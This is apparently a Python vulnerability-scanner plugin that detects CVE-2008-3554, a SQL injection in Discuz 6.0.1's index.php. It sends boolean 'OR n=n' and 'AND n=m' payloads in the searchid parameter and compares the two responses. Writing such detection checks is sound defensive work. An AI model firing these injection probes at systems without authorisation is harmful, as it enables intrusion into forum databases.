# -*- coding: utf-8 -*-
from random import randint

from engine.engine_utils.common import postRequest, getResponse, getRecord
from engine.engine_utils.rule_result_judge import page_similar
from engine.logger import scanLogger as logger


def run_domain(http,ob):
    '''
    未启用，待写
    CVE-2008-3554
    CNNVD-200808-103
    Discuz!是一款华人地区非常流行的Web论坛程序。
    Discuz 6.0.1的index.php存在SQL注入漏洞。远程攻击者可利用查询操作中的searchid参数，执行任意SQL命令。
    CVSS分值:	7.5	[严重(HIGH)]
    '''
    scheme = ob['scheme']
    domain = ob['domain']
    path = ob.get('path', '/')
    header = {'Host': domain}
    source_ip = ob.get('source_ip')
    if source_ip:
        domain = source_ip
    result = []
    try:
        if '/' != path[-1]:
            path += '/'
        true_load, false_load = num_type()
        params_t = "action=search&do=submit&searchid=22%s" % true_load
        params_f = "action=search&do=submit&searchid=22%s" % false_load
        url = '%s://%s%s%s' % (scheme, domain, path, 'index.php')

        res_t, content_t = http.request(url=url, method='POST', headers=header, body=params_t)
        res_f, content_f = http.request(url=url, method='POST', headers=header, body=params_f)
        status_t = res_t.get('status', '0')
        status_f = res_f.get('status', '0')
        similar = check_page_similar(status1=status_t, content1=content_t, status2=status_f, content2=content_f)
        if not similar:
            detail = "检测到Discuz 6.0.1的index.php存在SQL注入漏洞"
            request = postRequest(url, domain=ob['domain'])
            response = getResponse(res_f, content_f)
            result.append(getRecord(ob, url, ob['level'], detail, request, response))
    except Exception, e:
        logger.error("File:Discuz6_index_php_sql_inject.py, run_domain function:%s" % (str(e)))
    return result


def num_type():
    '''
    纯数字类型
    :return:
    '''
    random_num1 = randint(0, 499)
    random_num2 = randint(500, 999)
    true_load = " oR {0}={1}".format(random_num1, random_num1)
    false_load = " aNd {0}={1}".format(random_num1, random_num2)
    return [true_load, false_load]


def check_page_similar(status1, content1, status2, content2, rate=0.96):
    '''
    用于比较页面相似度，插件规则都可以用
    :param status: 响应状态码  str
    :param content: 响应body  str
    :param rate:  相似度阈值
    :return:  True 大于等于阈值，表示页面相似度高； False 小于阈值，表示页面相似度不高
    '''
    page_dict = {'status': status2, 'content': content2, 'similar_rate': rate}
    return page_similar(status1, content1, page_dict)